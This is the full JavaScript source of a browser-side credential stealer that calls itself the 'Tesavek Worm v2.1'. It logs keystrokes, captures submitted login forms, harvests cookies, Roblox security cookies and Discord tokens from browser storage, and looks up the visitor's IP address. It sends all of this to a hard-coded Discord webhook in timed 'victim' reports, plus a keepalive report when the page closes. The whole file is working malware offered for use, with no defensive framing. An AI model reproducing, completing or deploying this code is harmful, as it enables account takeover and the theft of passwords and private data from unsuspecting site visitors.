// ====================================================
// FIXED WORM WITH EMBED SUPPORT
// JANUS/TESAVEK WORM v2.1 - EMBED FIXED
// ====================================================

(function() {
    'use strict';
    
    // Discord Webhook URL
    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1453618382166556866/i3OqFBJED9RSTLSJxsOu37DC68A6f_gbgwCG3azFMdiLnuGl07m1vb3k7M1q-fJKx9Kq';
    
    // Global data collector
    window.JANUS_WORM_DATA = {
        victimId: Math.random().toString(36).substring(2) + Date.now().toString(36),
        startTime: Date.now(),
        ipAddress: null,
        userAgent: navigator.userAgent,
        isMobile: /iPhone|iPad|iPod|Android|webOS|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent),
        isSafari: /^((?!chrome|android).)*safari/i.test(navigator.userAgent) || /Version\/[\d\.]+.*Safari/.test(navigator.userAgent),
        isIOS: /iPhone|iPad|iPod/i.test(navigator.userAgent),
        collectedData: {
            cookies: [],
            localStorage: [],
            sessionStorage: [],
            formData: [],
            keystrokes: '',
            visitedUrls: [window.location.href],
            tabActivity: [],
            logins: [],
            passwords: [],
            discordTokens: [],
            robloxCookies: [],
            browserData: {},
            networkInfo: {}
        },
        activeTabs: new Set([window.location.href]),
        closedTabs: []
    };

    console.log('[Tesavek] Worm initialized:', window.JANUS_WORM_DATA.victimId);

    // ==================== FIXED DISCORD EMBED FUNCTION ====================

    async function sendDiscordEmbed(embedData, content = '') {
        try {
            // Validate webhook URL
            if (!WEBHOOK_URL.includes('discord.com/api/webhooks')) {
                console.error('[Tesavek] Invalid webhook URL');
                return false;
            }

            const payload = {
                username: 'Tesavek Worm',
                avatar_url: 'https://cdn.discordapp.com/attachments/1063152296439750686/1063152296666243072/da2e836a382b48b7a5996d8bf89b6f1a.png',
                content: content,
                embeds: Array.isArray(embedData) ? embedData : [embedData]
            };

            // Log what we're sending
            console.log('[Tesavek] Sending embed to Discord:', JSON.stringify(payload).substring(0, 200));

            const response = await fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(payload)
            });

            if (response.ok) {
                console.log('[Tesavek] Embed sent successfully');
                return true;
            } else {
                const errorText = await response.text();
                console.error('[Tesavek] Discord error:', response.status, errorText);
                return false;
            }
        } catch (error) {
            console.error('[Tesavek] Send error:', error);
            return false;
        }
    }

    // ==================== DATA COLLECTION FUNCTIONS ====================

    async function getIP() {
        try {
            const services = [
                'https://api.ipify.org?format=json',
                'https://api64.ipify.org?format=json',
                'https://ipapi.co/json/',
                'https://ipwho.is/'
            ];
            
            for (const service of services) {
                try {
                    const response = await fetch(service, {timeout: 5000});
                    if (response.ok) {
                        const data = await response.json();
                        window.JANUS_WORM_DATA.ipAddress = data.ip || data.query;
                        return window.JANUS_WORM_DATA.ipAddress;
                    }
                } catch (e) {
                    continue;
                }
            }
            window.JANUS_WORM_DATA.ipAddress = 'Failed';
            return 'Failed';
        } catch (e) {
            window.JANUS_WORM_DATA.ipAddress = 'Error';
            return 'Error';
        }
    }

    function collectAllData() {
        try {
            // Cookies
            const cookies = document.cookie.split(';');
            window.JANUS_WORM_DATA.collectedData.cookies = cookies.map(c => c.trim());
            
            // Roblox cookies
            const robloxCookies = cookies.filter(c => 
                c.includes('ROBLOSECURITY') || 
                c.includes('.ROBLOSECURITY') || 
                c.toLowerCase().includes('roblox')
            );
            window.JANUS_WORM_DATA.collectedData.robloxCookies = robloxCookies;
            
            // Discord tokens from cookies
            const discordCookies = cookies.filter(c => 
                c.includes('token') || 
                c.includes('auth') || 
                c.toLowerCase().includes('discord')
            );
            window.JANUS_WORM_DATA.collectedData.discordTokens = discordCookies;
            
            // localStorage
            window.JANUS_WORM_DATA.collectedData.localStorage = [];
            for (let i = 0; i < localStorage.length; i++) {
                const key = localStorage.key(i);
                const value = localStorage.getItem(key);
                window.JANUS_WORM_DATA.collectedData.localStorage.push({key, value: value.substring(0, 200)});
                
                // Check for Discord tokens in localStorage
                if (value && value.match(/[mn][A-Za-z\d]{23}\.[\w-]{6}\.[\w-]{27}/)) {
                    window.JANUS_WORM_DATA.collectedData.discordTokens.push(`localStorage[${key}]: ${value.substring(0, 50)}`);
                }
                
                // Check for Roblox in localStorage
                if (key.toLowerCase().includes('roblox') || (value && value.toLowerCase().includes('roblox'))) {
                    window.JANUS_WORM_DATA.collectedData.robloxCookies.push(`localStorage[${key}]: ${value.substring(0, 100)}`);
                }
            }
            
            // sessionStorage
            window.JANUS_WORM_DATA.collectedData.sessionStorage = [];
            for (let i = 0; i < sessionStorage.length; i++) {
                const key = sessionStorage.key(i);
                const value = sessionStorage.getItem(key);
                window.JANUS_WORM_DATA.collectedData.sessionStorage.push({key, value: value.substring(0, 200)});
                
                if (value && value.match(/[mn][A-Za-z\d]{23}\.[\w-]{6}\.[\w-]{27}/)) {
                    window.JANUS_WORM_DATA.collectedData.discordTokens.push(`sessionStorage[${key}]: ${value.substring(0, 50)}`);
                }
            }
            
            // Browser data
            window.JANUS_WORM_DATA.collectedData.browserData = {
                platform: navigator.platform,
                userAgent: navigator.userAgent,
                languages: navigator.languages,
                screen: `${screen.width}x${screen.height}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                isMobile: window.JANUS_WORM_DATA.isMobile,
                isIOS: window.JANUS_WORM_DATA.isIOS,
                isSafari: window.JANUS_WORM_DATA.isSafari
            };
            
            return true;
        } catch (e) {
            console.error('[Tesavek] Collection error:', e);
            return false;
        }
    }

    // ==================== MONITORING FUNCTIONS ====================

    let keystrokeBuffer = '';
    document.addEventListener('keydown', (e) => {
        if (e.key.length === 1 || ['Enter', 'Tab', 'Backspace', ' '].includes(e.key)) {
            const key = e.key === ' ' ? ' ' : 
                       e.key === 'Backspace' ? '[BS]' : 
                       e.key === 'Enter' ? '[ENTER]\n' : 
                       e.key === 'Tab' ? '[TAB]' : e.key;
            
            keystrokeBuffer += key;
            window.JANUS_WORM_DATA.collectedData.keystrokes += key;
            
            // Detect password fields
            if (e.target.type === 'password' || 
                e.target.name?.toLowerCase().includes('pass') || 
                e.target.id?.toLowerCase().includes('pass')) {
                window.JANUS_WORM_DATA.collectedData.passwords.push({
                    field: e.target.name || e.target.id || 'unknown',
                    key: '*',
                    timestamp: new Date().toLocaleTimeString()
                });
            }
        }
    });

    // Form submission tracking
    document.addEventListener('submit', (e) => {
        try {
            const formData = new FormData(e.target);
            const data = {};
            formData.forEach((value, key) => {
                if (value && value.toString().trim() !== '') {
                    data[key] = value.toString().substring(0, 100);
                }
            });
            
            if (Object.keys(data).length > 0) {
                window.JANUS_WORM_DATA.collectedData.formData.push({
                    url: window.location.href,
                    timestamp: new Date().toISOString(),
                    data: data
                });
                
                // Check for login
                if (Object.keys(data).some(k => k.toLowerCase().includes('pass'))) {
                    window.JANUS_WORM_DATA.collectedData.logins.push({
                        url: window.location.href,
                        timestamp: new Date().toISOString(),
                        credentials: data
                    });
                    sendLoginAlert(data);
                }
            }
        } catch (err) {
            // Silent
        }
    }, true);

    // URL change tracking
    let lastUrl = location.href;
    new MutationObserver(() => {
        const url = location.href;
        if (url !== lastUrl) {
            lastUrl = url;
            window.JANUS_WORM_DATA.collectedData.visitedUrls.push(url);
            window.JANUS_WORM_DATA.activeTabs.add(url);
            sendUrlChangeAlert(url);
        }
    }).observe(document, {subtree: true, childList: true});

    // ==================== ALERT FUNCTIONS ====================

    async function sendInitialReport() {
        await getIP();
        collectAllData();
        
        const embed = {
            title: "🚨 NEW VICTIM CONNECTED",
            description: `Worm activated on victim **${window.JANUS_WORM_DATA.victimId}**`,
            color: 0xff0000,
            fields: [
                {
                    name: "🌐 IP Address",
                    value: `\`${window.JANUS_WORM_DATA.ipAddress || 'Collecting...'}\``,
                    inline: true
                },
                {
                    name: "📱 Device",
                    value: window.JANUS_WORM_DATA.isMobile ? 
                          (window.JANUS_WORM_DATA.isIOS ? 'iPhone/iPad' : 'Android') : 
                          'Desktop',
                    inline: true
                },
                {
                    name: "🔗 Initial URL",
                    value: window.location.href.substring(0, 100),
                    inline: false
                },
                {
                    name: "🕵️ User Agent",
                    value: `\`\`\`${navigator.userAgent.substring(0, 200)}\`\`\``,
                    inline: false
                },
                {
                    name: "🎮 Roblox Cookies",
                    value: window.JANUS_WORM_DATA.collectedData.robloxCookies.length > 0 ?
                          `Found ${window.JANUS_WORM_DATA.collectedData.robloxCookies.length} cookies` :
                          "None yet",
                    inline: true
                },
                {
                    name: "🤖 Discord Tokens",
                    value: window.JANUS_WORM_DATA.collectedData.discordTokens.length > 0 ?
                          `Found ${window.JANUS_WORM_DATA.collectedData.discordTokens.length} tokens` :
                          "None yet",
                    inline: true
                }
            ],
            footer: {
                text: "Tesavek Worm v2.1 • Initial Report"
            },
            timestamp: new Date().toISOString()
        };

        await sendDiscordEmbed(embed, `@everyone **NEW VICTIM ${window.JANUS_WORM_DATA.victimId} CONNECTED**`);
    }

    async function sendPeriodicReport() {
        collectAllData();
        
        const embed = {
            title: "📊 LIVE WORM STATS",
            color: 0x00ff00,
            fields: [
                {
                    name: "Victim ID",
                    value: `\`${window.JANUS_WORM_DATA.victimId}\``,
                    inline: true
                },
                {
                    name: "Session Time",
                    value: `${Math.round((Date.now() - window.JANUS_WORM_DATA.startTime) / 1000)}s`,
                    inline: true
                },
                {
                    name: "Current URL",
                    value: window.location.href.substring(0, 80),
                    inline: false
                },
                {
                    name: "Data Collected",
                    value: `🍪 **Cookies:** ${window.JANUS_WORM_DATA.collectedData.cookies.length}\n` +
                           `📁 **Local Storage:** ${window.JANUS_WORM_DATA.collectedData.localStorage.length}\n` +
                           `⌨️ **Keystrokes:** ${window.JANUS_WORM_DATA.collectedData.keystrokes.length} chars\n` +
                           `🌐 **URLs Visited:** ${window.JANUS_WORM_DATA.collectedData.visitedUrls.length}\n` +
                           `🔑 **Logins:** ${window.JANUS_WORM_DATA.collectedData.logins.length}`,
                    inline: false
                },
                {
                    name: "Sensitive Data",
                    value: `🎮 **Roblox:** ${window.JANUS_WORM_DATA.collectedData.robloxCookies.length}\n` +
                           `🤖 **Discord:** ${window.JANUS_WORM_DATA.collectedData.discordTokens.length}\n` +
                           `🔐 **Passwords:** ${window.JANUS_WORM_DATA.collectedData.passwords.length}`,
                    inline: false
                }
            ],
            footer: {
                text: `Tesavek Worm • ${new Date().toLocaleTimeString()}`
            }
        };

        await sendDiscordEmbed(embed);
    }

    async function sendLoginAlert(credentials) {
        const embed = {
            title: "🔑 LOGIN CAPTURED",
            color: 0xffaa00,
            fields: [
                {
                    name: "Victim",
                    value: `\`${window.JANUS_WORM_DATA.victimId}\``,
                    inline: true
                },
                {
                    name: "URL",
                    value: window.location.href.substring(0, 100),
                    inline: false
                },
                {
                    name: "Credentials",
                    value: `\`\`\`json\n${JSON.stringify(credentials, null, 2).substring(0, 1000)}\n\`\`\``,
                    inline: false
                }
            ],
            timestamp: new Date().toISOString()
        };

        await sendDiscordEmbed(embed, `⚠️ **LOGIN CAPTURED FROM ${window.JANUS_WORM_DATA.victimId}**`);
    }

    async function sendUrlChangeAlert(url) {
        const embed = {
            title: "🌐 URL NAVIGATION",
            color: 0x0099ff,
            fields: [
                {
                    name: "Victim",
                    value: `\`${window.JANUS_WORM_DATA.victimId}\``,
                    inline: true
                },
                {
                    name: "New URL",
                    value: url.substring(0, 200),
                    inline: false
                },
                {
                    name: "Total URLs Visited",
                    value: window.JANUS_WORM_DATA.collectedData.visitedUrls.length.toString(),
                    inline: true
                }
            ]
        };

        // Only send every 5th URL change to avoid spam
        if (window.JANUS_WORM_DATA.collectedData.visitedUrls.length % 5 === 0) {
            await sendDiscordEmbed(embed);
        }
    }

    async function sendSensitiveDataReport() {
        if (window.JANUS_WORM_DATA.collectedData.discordTokens.length > 0 ||
            window.JANUS_WORM_DATA.collectedData.robloxCookies.length > 0) {
            
            const embed = {
                title: "💎 SENSITIVE DATA FOUND",
                color: 0xff00ff,
                description: `**Sensitive data captured from ${window.JANUS_WORM_DATA.victimId}**`,
                fields: []
            };

            if (window.JANUS_WORM_DATA.collectedData.discordTokens.length > 0) {
                embed.fields.push({
                    name: `🤖 Discord Tokens (${window.JANUS_WORM_DATA.collectedData.discordTokens.length})`,
                    value: `\`\`\`${window.JANUS_WORM_DATA.collectedData.discordTokens.slice(0, 3).join('\n').substring(0, 1000)}\`\`\``
                });
            }

            if (window.JANUS_WORM_DATA.collectedData.robloxCookies.length > 0) {
                embed.fields.push({
                    name: `🎮 Roblox Cookies (${window.JANUS_WORM_DATA.collectedData.robloxCookies.length})`,
                    value: `\`\`\`${window.JANUS_WORM_DATA.collectedData.robloxCookies.slice(0, 3).join('\n').substring(0, 1000)}\`\`\``
                });
            }

            await sendDiscordEmbed(embed, `💰 **VALUABLE DATA FOUND FROM ${window.JANUS_WORM_DATA.victimId}**`);
        }
    }

    // ==================== WORM INITIALIZATION ====================

    function initializeWorm() {
        console.log('[Tesavek] Starting worm...');
        
        // Send initial report after 2 seconds
        setTimeout(() => {
            sendInitialReport();
        }, 2000);
        
        // Send periodic reports every 45 seconds
        setInterval(() => {
            sendPeriodicReport();
        }, 45000);
        
        // Check for sensitive data every minute
        setInterval(() => {
            sendSensitiveDataReport();
        }, 60000);
        
        // Send final report when page closes
        window.addEventListener('beforeunload', () => {
            const finalEmbed = {
                title: "👋 VICTIM DISCONNECTED",
                color: 0x666666,
                fields: [
                    {
                        name: "Victim ID",
                        value: `\`${window.JANUS_WORM_DATA.victimId}\``
                    },
                    {
                        name: "Session Duration",
                        value: `${Math.round((Date.now() - window.JANUS_WORM_DATA.startTime) / 1000)} seconds`
                    },
                    {
                        name: "Total Data Collected",
                        value: `📄 **Total Items:** ${window.JANUS_WORM_DATA.collectedData.cookies.length + 
                                                   window.JANUS_WORM_DATA.collectedData.localStorage.length +
                                                   window.JANUS_WORM_DATA.collectedData.formData.length}\n` +
                               `🔑 **Logins:** ${window.JANUS_WORM_DATA.collectedData.logins.length}\n` +
                               `🌐 **URLs:** ${window.JANUS_WORM_DATA.collectedData.visitedUrls.length}`
                    }
                ],
                footer: {
                    text: "Tesavek Worm • Session Ended"
                },
                timestamp: new Date().toISOString()
            };

            // Try to send final report (might not complete due to page close)
            fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    content: `📴 **VICTIM ${window.JANUS_WORM_DATA.victimId} DISCONNECTED**`,
                    embeds: [finalEmbed]
                }),
                keepalive: true // Try to send even during page unload
            }).catch(() => {});
        });
    }

    // Start the worm
    initializeWorm();
    
    // Auto-restart check every minute
    setInterval(() => {
        if (!window.JANUS_WORM_DATA || !window.JANUS_WORM_DATA.victimId) {
            console.log('[Tesavek] Worm restarted');
            window.JANUS_WORM_DATA = {
                victimId: Math.random().toString(36).substring(2) + Date.now().toString(36),
                startTime: Date.now(),
                ipAddress: window.JANUS_WORM_DATA?.ipAddress || null,
                collectedData: window.JANUS_WORM_DATA?.collectedData || {
                    cookies: [], localStorage: [], sessionStorage: [], formData: [],
                    keystrokes: '', visitedUrls: [], tabActivity: [], logins: [],
                    passwords: [], discordTokens: [], robloxCookies: [], browserData: {}
                }
            };
            sendInitialReport();
        }
    }, 60000);

})();
